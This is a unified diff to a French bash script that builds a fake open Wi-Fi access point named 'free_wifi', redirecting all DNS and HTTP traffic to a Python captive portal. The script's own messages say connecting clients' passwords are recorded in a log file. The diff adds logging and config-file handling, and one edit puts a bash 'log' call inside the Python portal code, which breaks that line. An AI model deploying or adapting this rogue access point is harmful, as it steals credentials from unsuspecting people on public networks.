@@ -1,16 +1,38 @@
 #!/bin/bash
 set -euo pipefail
-trap 'echo "[❌] Erreur sur la ligne ${LINENO}: Commande échouée avec le code de sortie $?"' ERR
+
+# Configuration du logging
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+LOG_DIR="$SCRIPT_DIR/logs"
+LOG_FILE="$LOG_DIR/fake_wifi.log"
+
+# Création du dossier logs s'il n'existe pas
+mkdir -p "$LOG_DIR"
+
+# Fonction de logging
+log() {
+    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+    local message="[$timestamp] $1"
+    echo "$message" | tee -a "$LOG_FILE"
+}
+
+# Nettoyage du fichier de log au démarrage
+echo "" > "$LOG_FILE"
+
+# Redirection de stderr vers le fichier de log
+exec 2>> "$LOG_FILE"
+
+trap 'log "[❌] Erreur sur la ligne ${LINENO}: Commande échouée avec le code de sortie $?"' ERR
 
 if [[ $EUID -ne 0 ]]; then
-    echo "[❌] Ce script doit être exécuté en tant que root."
+    log "[❌] Ce script doit être exécuté en tant que root."
     exit 1
 fi
 
 check_interface() {
     local iface="$1"
     if ! ip link show "$iface" &>/dev/null; then
-        echo "[❌] L'interface '$iface' n'existe pas."
+        log "[❌] L'interface '$iface' n'existe pas."
         exit 1
     fi
 }
@@ -18,11 +40,11 @@ check_interface() {
 install_package() {
     local pkg="$1"
     if dpkg -s "$pkg" &>/dev/null; then
-        echo "[✅] $pkg est installé."
+        log "[✅] $pkg est installé."
     else
-        echo "[⚠️] $pkg n'est pas installé. Installation en cours..."
-        apt-get install -y "$pkg" || { echo "[❌] Échec de l'installation de $pkg."; exit 1; }
-        echo "[✅] $pkg installé."
+        log "[⚠️] $pkg n'est pas installé. Installation en cours..."
+        apt-get install -y "$pkg" || { log "[❌] Échec de l'installation de $pkg."; exit 1; }
+        log "[✅] $pkg installé."
     fi
 }
 
@@ -30,46 +52,73 @@ start_service() {
     local service_cmd="$1"
     local check_cmd="$2"
     local service_name="$3"
-    echo "[ℹ️] Démarrage de $service_name..."
+    log "[ℹ️] Démarrage de $service_name..."
     eval "$service_cmd" &
     for i in {1..10}; do
         sleep 1
         if eval "$check_cmd"; then
-            echo "[✅] $service_name est actif."
+            log "[✅] $service_name est actif."
             return
         fi
     done
-    echo "[❌] $service_name n'a pas démarré."
+    log "[❌] $service_name n'a pas démarré."
     exit 1
 }
 
-WIFI_IFACE="${WIFI_IFACE:-wlp7s0}"
-check_interface "$WIFI_IFACE"
+# Lecture de la configuration
+CONFIG_FILE="config.json"
+if [ ! -f "$CONFIG_FILE" ]; then
+    log "[❌] Fichier de configuration non trouvé !"
+    exit 1
+fi
+
+# Extraction de l'interface depuis la configuration
+WIFI_IFACE=$(jq -r '.wifi_interface' "$CONFIG_FILE")
+MONITOR_SUPPORTED=$(jq -r '.monitor_supported' "$CONFIG_FILE")
+
+if [[ -z "$WIFI_IFACE" ]]; then
+    log "[❌] Interface non configurée !"
+    exit 1
+fi
+
+log "[✅] Interface configurée : $WIFI_IFACE"
+
+# Vérification du support du mode monitor
+if [[ "$MONITOR_SUPPORTED" != "true" ]]; then
+    log "[⚠️] Attention : Cette interface ne supporte pas le mode monitor."
+    log "     Le point d'accès pourrait ne pas fonctionner correctement."
+    read -p "Voulez-vous continuer quand même ? (o/N) " -n 1 -r
+    echo
+    if [[ ! $REPLY =~ ^[Oo]$ ]]; then
+        exit 1
+    fi
+fi
+
 OUT_IFACE="${OUT_IFACE:-$(ip route | awk '/^default/{print $5; exit}')}"
 if [ -z "$OUT_IFACE" ]; then
-    echo "[❌] Impossible de détecter l'interface de sortie par défaut."
+    log "[❌] Impossible de détecter l'interface de sortie par défaut."
     exit 1
 fi
 check_interface "$OUT_IFACE"
 
-echo "[ℹ️] Désactivation du contrôle de NetworkManager pour $WIFI_IFACE..."
+log "[ℹ️] Désactivation du contrôle de NetworkManager pour $WIFI_IFACE..."
 if command -v nmcli &>/dev/null; then
-    nmcli device set "$WIFI_IFACE" managed no || { echo "[❌] Échec de désactiver NetworkManager sur $WIFI_IFACE."; exit 1; }
+    nmcli device set "$WIFI_IFACE" managed no || { log "[❌] Échec de désactiver NetworkManager sur $WIFI_IFACE."; exit 1; }
 fi
 
-echo "[ℹ️] Arrêt de wpa_supplicant sur $WIFI_IFACE..."
+log "[ℹ️] Arrêt de wpa_supplicant sur $WIFI_IFACE..."
 pkill wpa_supplicant || true
 
-echo "[ℹ️] Mise en down de $WIFI_IFACE..."
+log "[ℹ️] Mise en down de $WIFI_IFACE..."
 ip link set "$WIFI_IFACE" down
 sleep 1
 ip addr flush dev "$WIFI_IFACE" || true
 
-echo "[ℹ️] Configuration de $WIFI_IFACE en mode AP (réseau ouvert)..."
+log "[ℹ️] Configuration de $WIFI_IFACE en mode AP (réseau ouvert)..."
 ip addr add 192.168.1.1/24 dev "$WIFI_IFACE"
 ip link set "$WIFI_IFACE" up
 
-echo "[🔍] Mise à jour des listes de paquets..."
+log "[🔍] Mise à jour des listes de paquets..."
 apt-get update -qq
 
 DEPENDENCIES=(hostapd dnsmasq iw wireless-tools python3)
@@ -77,7 +126,7 @@ for pkg in "${DEPENDENCIES[@]}"; do
     install_package "$pkg"
 done
 
-echo "[📡] Configuration du point d'accès Wi-Fi (réseau ouvert)..."
+log "[📡] Configuration du point d'accès Wi-Fi (réseau ouvert)..."
 cat > /etc/hostapd/hostapd.conf <<EOF
 interface=$WIFI_IFACE
 driver=nl80211
@@ -85,11 +134,11 @@ ssid=free_wifi
 hw_mode=g
 channel=6
 EOF
-echo "[✅] Configuration hostapd créée."
+log "[✅] Configuration hostapd créée."
 
 start_service "hostapd -B /etc/hostapd/hostapd.conf" "pgrep -x hostapd &>/dev/null" "hostapd"
 
-echo "[⚙️] Configuration de dnsmasq pour le DHCP et la redirection DNS..."
+log "[⚙️] Configuration de dnsmasq pour le DHCP et la redirection DNS..."
 cat > /etc/dnsmasq.conf <<EOF
 interface=$WIFI_IFACE
 bind-interfaces
@@ -100,16 +149,16 @@ address=/#/192.168.1.1
 log-queries
 log-dhcp
 EOF
-echo "[✅] Configuration dnsmasq créée."
+log "[✅] Configuration dnsmasq créée."
 
 pkill dnsmasq || true
 start_service "dnsmasq -C /etc/dnsmasq.conf" "pgrep -x dnsmasq &>/dev/null" "dnsmasq"
 
-echo "[🔄] Activation du NAT..."
+log "[🔄] Activation du NAT..."
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -o "$OUT_IFACE" -j MASQUERADE
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
-echo "[✅] NAT et redirection configurés."
+log "[✅] NAT et redirection configurés."
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 PORTAL_FILE="$SCRIPT_DIR/captive.py"
@@ -221,17 +270,17 @@ class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
 if __name__ == "__main__":
     PORT = 8080
     with socketserver.TCPServer(("", PORT), CaptiveHandler) as httpd:
-        print("Portail captif lancé sur le port", PORT)
+        log "Portail captif lancé sur le port", PORT
         httpd.serve_forever()
 EOF
 
 chmod +x "$PORTAL_FILE"
-echo "[✅] Portail captif créé."
+log "[✅] Portail captif créé."
 
 start_service "python3 $PORTAL_FILE" "pgrep -f captive.py &>/dev/null" "Portail Captif"
 
 cleanup() {
-    echo "[🔚] Arrêt du faux Wi-Fi..."
+    log "[🔚] Arrêt du faux Wi-Fi..."
     pkill hostapd
     pkill dnsmasq
     pkill -f captive.py
@@ -245,10 +294,10 @@ cleanup() {
 }
 trap cleanup SIGINT
 
-echo "[✅] Faux Wi-Fi 'free_wifi' activé avec portail captif sur $WIFI_IFACE."
-echo "[ℹ️] Les clients seront redirigés vers le portail et leurs mots de passe seront enregistrés dans $LOG_FILE."
-echo "[ℹ️] Si le navigateur ne s'ouvre pas automatiquement, ouvrez manuellement une page web."
-echo "[ℹ️] Appuyez sur Ctrl+C pour arrêter."
+log "[✅] Faux Wi-Fi 'free_wifi' activé avec portail captif sur $WIFI_IFACE."
+log "[ℹ️] Les clients seront redirigés vers le portail et leurs mots de passe seront enregistrés dans $LOG_FILE."
+log "[ℹ️] Si le navigateur ne s'ouvre pas automatiquement, ouvrez manuellement une page web."
+log "[ℹ️] Appuyez sur Ctrl+C pour arrêter."
 
 while true; do sleep 1; done
 
